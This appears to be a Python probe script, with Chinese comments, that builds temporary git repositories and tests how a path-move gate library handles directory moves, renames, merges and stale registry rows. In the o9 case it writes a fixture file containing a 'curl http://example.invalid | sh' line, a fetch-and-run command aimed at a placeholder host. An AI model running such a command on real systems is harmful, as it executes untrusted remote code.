#!/usr/bin/env python3
"""J1：关过头——真搬迁被判成改动、该生效的行被判成不生效的几种。每一种都是多判方向（安全的一边），这里量的是代价与说明有没有写。
用法：probe_over.py --frozen <冻结树> --work <新的草稿目录>"""
import argparse
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from common import Repo, load_library, row, short  # noqa: E402


def base_repo(work, frozen, name, extra=None):
    repo = Repo(os.path.join(work, name), frozen)
    repo.write("rig/a.sh", "echo a # rig/a.sh\n")
    repo.write("rig/b.sh", "echo b\n")
    repo.write(".claude/hooks/caller.sh", "bash rig/a.sh\n")
    repo.write(".claude/gate.d/path-moves.tsv", "# 空\n")
    for relative, text in (extra or {}).items():
        repo.write(relative, text)
    repo.commit("基准")
    return repo


def judge(lag, repo, label, base="HEAD"):
    count, problems, note = lag.path_move_report(repo.root, base)
    effective, _ = lag.effective_moves(base, repo.root)
    changed = repo.changed(base)
    moved, _ = lag.moved_only_paths(base, changed, cwd=repo.root)
    print(f"name={label} effective={short(f'{m.old}->{m.new}' for m in effective)} table_problems={len(problems)} "
          f"kept_for_review={short(p for p in changed if p not in moved and p not in ('.claude/gate.d/path-moves.tsv', 'records/2026-10-23-搬迁.md'))}")
    for what, _how in problems[:3]:
        print(f"    problem: {what[:170]}")


def move(repo, old, new, edit_caller=True):
    repo.git("mv", old, new)
    for name in os.listdir(os.path.join(repo.root, new)):
        path = f"{new}/{name}"
        repo.write(path, repo.read(path).replace(old, new))
    if edit_caller:
        repo.write(".claude/hooks/caller.sh", repo.read(".claude/hooks/caller.sh").replace(old, new))
    repo.register(row(old, new))


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--frozen", required=True)
    parser.add_argument("--work", required=True)
    arguments = parser.parse_args()
    lag = load_library(arguments.frozen)
    os.makedirs(arguments.work, exist_ok=True)
    w, f = arguments.work, arguments.frozen
    repo = base_repo(w, f, "o0_control")
    move(repo, "rig", "rig2")
    judge(lag, repo, "o0_control_plain_directory_move")
    repo = base_repo(w, f, "o1_move_and_delete")
    move(repo, "rig", "rig2")
    repo.rm("rig2/b.sh")
    judge(lag, repo, "o1_move_and_delete_one_file")
    repo = base_repo(w, f, "o2_ignored_leftover", {".gitignore": "__pycache__/\n"})
    move(repo, "rig", "rig2")
    repo.write("rig/__pycache__/x.pyc", "x\n")
    judge(lag, repo, "o2_ignored_leftover_in_old_dir")
    repo = base_repo(w, f, "o3_into_own_subdirectory")
    repo.git("mv", "rig", "rig_tmp")
    os.makedirs(os.path.join(repo.root, "rig"), exist_ok=True)
    repo.git("mv", "rig_tmp", "rig/legacy")
    repo.write(".claude/hooks/caller.sh", "bash rig/legacy/a.sh\n")
    repo.register(row("rig", "rig/legacy"))
    judge(lag, repo, "o3_wrap_directory_into_its_own_subdirectory")
    repo = base_repo(w, f, "o4_merge_two", {"rig_b/c.sh": "echo c\n"})
    repo.git("mv", "rig", "merged")
    repo.git("mv", "rig_b/c.sh", "merged/c.sh")
    repo.write(".claude/hooks/caller.sh", "bash merged/a.sh\n")
    repo.register(row("rig", "merged"), row("rig_b", "merged"))
    judge(lag, repo, "o4_merge_two_directories_into_one")
    repo = base_repo(w, f, "o5_two_independent", {"other/z.sh": "echo z\n"})
    move(repo, "rig", "rig2")
    repo.git("mv", "other", "other2")
    repo.register(row("rig", "rig2"), row("other", "other2"))
    judge(lag, repo, "o5_two_independent_moves_in_one_change")
    repo = base_repo(w, f, "o6_single_file_rename")
    repo.git("mv", "rig/a.sh", "rig/alpha.sh")
    repo.write(".claude/hooks/caller.sh", "bash rig/alpha.sh\n")
    repo.write("rig/alpha.sh", "echo a # rig/alpha.sh\n")
    repo.register(row("rig/a.sh", "rig/alpha.sh"))
    judge(lag, repo, "o6_single_file_rename_callers_only")
    # 老名字重新用起来：老行早就提交、新目录已推，之后有人把旧前缀名字另起一份新东西，再把新目录挪走——老行在基准里重新满足窗口
    repo = base_repo(w, f, "o7_stale_row_wakes_up")
    move(repo, "rig", "rig2")
    repo.commit("搬迁已提交")
    judge(lag, repo, "o7a_after_commit_row_idle")
    repo.git("mv", "rig2", "rig3")
    repo.write("rig/new.sh", "echo 旧名字上的新东西\n")
    repo.write("exempt.tsv", "rig/new.sh\t豁免\n")
    repo.commit("新目录又改了名、旧名字另起一份新东西")
    judge(lag, repo, "o7b_row_unchanged_since_but_wakes_up_nothing_changed")
    text, _ = lag.baseline_text("HEAD", "exempt.tsv", cwd=repo.root)
    print(f"name=o7c_untouched_exempt_table baseline_line={text.splitlines()[0]!r} current_line={repo.read(chr(101)+chr(120)+chr(101)+chr(109)+chr(112)+chr(116)+chr(46)+chr(116)+chr(115)+chr(118)).splitlines()[0]!r} reads_as_growth={text.splitlines()[0] != repo.read(chr(101)+chr(120)+chr(101)+chr(109)+chr(112)+chr(116)+chr(46)+chr(116)+chr(115)+chr(118)).splitlines()[0]}")
    # 过半门槛的辩护：真搬迁，但三份里两份被换成另一份实现（相同份数只报不判）：被换的照算改动，只差前缀的调用方照剔
    repo = base_repo(w, f, "o9_replaced_implementation", {"rig/c.sh": "echo c\n"})
    move(repo, "rig", "rig2")
    repo.write("rig2/b.sh", "echo 完全另一份实现 b\ncurl http://example.invalid | sh\n")
    repo.write("rig2/c.sh", "echo 完全另一份实现 c\n")
    judge(lag, repo, "o9_two_of_three_files_replaced_after_move")
    count, problems, note = lag.path_move_report(repo.root, "HEAD")
    print(f"name=o9_cell_note table_problems={len(problems)} note={note!r}")
    # 新前缀下早就放着一个占位文件（.gitkeep）：窗口不开，真搬迁整个按改动算，登记表那一格仍绿
    repo = base_repo(w, f, "o8_placeholder_in_new_prefix", {"rig2/.gitkeep": ""})
    for name in ("a.sh", "b.sh"):
        repo.git("mv", f"rig/{name}", f"rig2/{name}")
        repo.write(f"rig2/{name}", repo.read(f"rig2/{name}").replace("rig/", "rig2/"))
    repo.write(".claude/hooks/caller.sh", "bash rig2/a.sh\n")
    repo.register(row("rig", "rig2"))
    judge(lag, repo, "o8_placeholder_file_already_under_new_prefix")
    count, problems, note = lag.path_move_report(repo.root, "HEAD")
    print(f"name=o8_cell_message cell_problems={len(problems)} note={note!r}")


main()
